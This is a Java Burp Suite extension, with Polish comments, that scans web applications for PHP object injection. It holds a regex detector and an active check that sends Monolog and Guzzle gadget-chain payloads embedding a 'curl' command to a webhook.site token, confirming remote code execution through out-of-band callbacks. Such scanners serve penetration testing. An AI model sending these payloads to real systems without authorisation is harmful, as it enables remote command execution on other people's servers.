import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.scanner.AuditResult;
import burp.api.montoya.scanner.ConsolidationAction;
import burp.api.montoya.scanner.ScanCheck;
import burp.api.montoya.scanner.audit.insertionpoint.AuditInsertionPoint;
import burp.api.montoya.scanner.audit.issues.AuditIssue;
import burp.api.montoya.scanner.audit.issues.AuditIssueConfidence;
import burp.api.montoya.scanner.audit.issues.AuditIssueSeverity;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class PhpObjectInjectionScanner implements BurpExtension {

    // TUTAJ PODAJ SWÓJ UNIKALNY TOKEN Z WEBHOOK.SITE (UUID)
    private static final String WEBHOOK_TOKEN = "4bf65359-8fea-4f04-88a7-481e20284335";

    private MontoyaApi api;
    private ScheduledExecutorService scheduler;
    private int lastWebhookInteractionCount = 0;

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        this.api.extension().setName("PHP Object Injection Scanner");

        // Rejestracja skanerów pasywnego i aktywnego
        api.scanner().registerScanCheck(new PoiPassiveScanCheck(api));
        api.scanner().registerScanCheck(new PoiActiveScanCheck(api, WEBHOOK_TOKEN));

        // Asynchroniczny wątek odpytujący API Webhook.site
        this.scheduler = Executors.newScheduledThreadPool(1);
        this.scheduler.scheduleAtFixedRate(this::pollWebhookInteractions, 10, 10, TimeUnit.SECONDS);

        api.extension().registerUnloadingHandler(() -> {
            if (scheduler != null && !scheduler.isShutdown()) {
                scheduler.shutdownNow();
            }
        });

        api.logging().logToOutput("Wtyczka PHP Object Injection Scanner (Webhook.site) załadowana.");
    }

    private void pollWebhookInteractions() {

        try {
            String apiUrl = "https://webhook.site/token/" + WEBHOOK_TOKEN + "/requests";
            HttpRequest request = HttpRequest.httpRequestFromUrl(apiUrl);
            HttpRequestResponse response = api.http().sendRequest(request);

            String body = response.response().bodyToString();

            // Wyszukiwanie pola "total" w prostej odpowiedzi JSON z webhook.site
            Matcher matcher = Pattern.compile("\"total\":\\s*([0-9]+)").matcher(body);
            if (matcher.find()) {
                int currentTotal = Integer.parseInt(matcher.group(1));

                // Jeśli wykryto nowe żądania, oznaczamy udaną eksploatację
                if (currentTotal > lastWebhookInteractionCount) {
                    int newInteractions = currentTotal - lastWebhookInteractionCount;
                    api.logging().logToOutput("Sukces! Wykryto nową interakcję OOB (HTTP)! Zarejestrowano " + newInteractions + " nowych wywołań w Webhook.site.");
                    // W docelowej architekturze należy wygenerować tutaj powiązany AuditIssue do zakładki SiteMap

                    lastWebhookInteractionCount = currentTotal;
                }
            }
        } catch (Exception e) {
            api.logging().logToError("Błąd podczas łączenia z API webhook.site: " + e.getMessage());
        }
    }

    // --- KLASA SKANOWANIA PASYWNEGO ---
    private static class PoiPassiveScanCheck implements ScanCheck {
        private final MontoyaApi api;
        private final Pattern POI_PATTERN = Pattern.compile("(O:[0-9]+:\"[^\"]+\":[0-9]+:\\{|a:[0-9]+:\\{)");

        public PoiPassiveScanCheck(MontoyaApi api) {
            this.api = api;
        }

        @Override
        public AuditResult passiveAudit(HttpRequestResponse baseRequestResponse) {
            List<AuditIssue> issues = new ArrayList<>();
            HttpRequest request = baseRequestResponse.request();

            request.parameters().forEach(parameter -> {
                String value = parameter.value();

                if (isSerializedPhp(value)) {
                    issues.add(createIssue(baseRequestResponse, "Znaleziono zserializowany obiekt PHP (Plaintext)"));
                } else {
                    String urlDecoded = api.utilities().urlUtils().decode(value).toString();
                    if (isSerializedPhp(urlDecoded)) {
                        issues.add(createIssue(baseRequestResponse, "Znaleziono zserializowany obiekt PHP (URL Decoded)"));
                    } else {
                        try {
                            String base64Decoded = api.utilities().base64Utils().decode(value).toString();
                            if (isSerializedPhp(base64Decoded)) {
                                issues.add(createIssue(baseRequestResponse, "Znaleziono zserializowany obiekt PHP (Base64 Decoded)"));
                            }
                        } catch (Exception ignored) { }
                    }
                }
            });

            return AuditResult.auditResult(issues);
        }

        @Override
        public AuditResult activeAudit(HttpRequestResponse baseRequestResponse, AuditInsertionPoint insertionPoint) {
            return AuditResult.auditResult(new ArrayList<>());
        }

        @Override
        public ConsolidationAction consolidateIssues(AuditIssue newIssue, AuditIssue existingIssue) {
            return newIssue.name().equals(existingIssue.name()) ? ConsolidationAction.KEEP_EXISTING : ConsolidationAction.KEEP_BOTH;
        }

        private boolean isSerializedPhp(String value) {
            return value != null && !value.isEmpty() && POI_PATTERN.matcher(value).find();
        }

        private AuditIssue createIssue(HttpRequestResponse reqRes, String title) {
            return AuditIssue.auditIssue(
                    title,
                    "Wykryto sygnatury zserializowanego obiektu PHP w parametrach wejściowych. Parametr może być podatny na POI.",
                    null, reqRes.request().url(),
                    AuditIssueSeverity.INFORMATION, AuditIssueConfidence.FIRM,
                    null, null, AuditIssueSeverity.INFORMATION, reqRes
            );
        }
    }

    // --- KLASA SKANOWANIA AKTYWNEGO ---
    private static class PoiActiveScanCheck implements ScanCheck {
        private final MontoyaApi api;
        private final String webhookToken;
        private final Pattern PHP_ERROR_PATTERN = Pattern.compile("(?i)(unserialize\\(\\)|PHP Fatal error|Object\\sInjection)");

        public PoiActiveScanCheck(MontoyaApi api, String webhookToken) {
            this.api = api;
            this.webhookToken = webhookToken;
        }

        @Override
        public AuditResult activeAudit(HttpRequestResponse baseRequestResponse, AuditInsertionPoint insertionPoint) {
            List<AuditIssue> issues = new ArrayList<>();

            // 1. Detekcja błędów (Wywołanie błędu aplikacji)
            String errorPayload = "O:999999:\"NonExistentClassForErrorTrigger\":0:{}";
            HttpRequest errorRequest = insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(errorPayload));
            HttpRequestResponse errorReqRes = api.http().sendRequest(errorRequest);

            Matcher errorMatcher = PHP_ERROR_PATTERN.matcher(errorReqRes.response().bodyToString());
            if (errorMatcher.find()) {
                issues.add(AuditIssue.auditIssue(
                        "Podejrzenie PHP Object Injection (Wykryto błąd)",
                        "Aplikacja zwróciła błąd funkcji unserialize() po przesłaniu niewłaściwego obiektu.",
                        null, errorReqRes.request().url(),
                        AuditIssueSeverity.MEDIUM, AuditIssueConfidence.TENTATIVE,
                        null, null, AuditIssueSeverity.MEDIUM, errorReqRes
                ));
            }

            // 2. Fuzzing przy użyciu zamkniętego zestawu łańcuchów gadżetów z użyciem Webhook.site
            // Zbudowanie polecenia, które wywoła na serwerze żądanie HTTP na nasz darmowy Webhook
            String cmd = "curl -s http://webhook.site/" + webhookToken;
            int cmdLen = cmd.length();

            // Pula statystycznie skutecznych payloadów, długość komendy (cmdLen) liczona jest
            // dynamicznie, by nie uszkodzić struktury serializacji PHP
            String[] gadgetChains = {
                    // Monolog/RCE1
                    "O:32:\"Monolog\\Handler\\SyslogUdpHandler\":1:{s:9:\"\\x00*\\x00socket\";O:29:\"Monolog\\Handler\\BufferHandler\":7:{s:10:\"\\x00*\\x00handler\";r:2;s:9:\"\\x00*\\x00buffer\";a:1:{i:0;a:2:{i:0;s:" + cmdLen + ":\"" + cmd + "\";s:5:\"level\";N;}}s:13:\"\\x00*\\x00bufferSize\";i:-1;s:14:\"\\x00*\\x00initialized\";b:1;s:14:\"\\x00*\\x00bufferLimit\";i:-1;s:13:\"\\x00*\\x00flushOnOverflow\";b:0;s:8:\"\\x00*\\x00level\";N;}}",
                    // Guzzle/FW1
                    "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\\x00GuzzleHttp\\Psr7\\FnStream\\x00methods\";a:1:{s:5:\"close\";s:4:\"exec\";}s:9:\"_fn_close\";s:" + cmdLen + ":\"" + cmd + "\";}"
            };

            for (String gadgetPayload : gadgetChains) {
                HttpRequest oobRequest = insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(gadgetPayload));
                api.http().sendRequest(oobRequest);
            }

            return AuditResult.auditResult(issues);
        }

        @Override
        public AuditResult passiveAudit(HttpRequestResponse baseRequestResponse) {
            return AuditResult.auditResult(new ArrayList<>());
        }

        @Override
        public ConsolidationAction consolidateIssues(AuditIssue newIssue, AuditIssue existingIssue) {
            return newIssue.name().equals(existingIssue.name()) ? ConsolidationAction.KEEP_EXISTING : ConsolidationAction.KEEP_BOTH;
        }
    }
}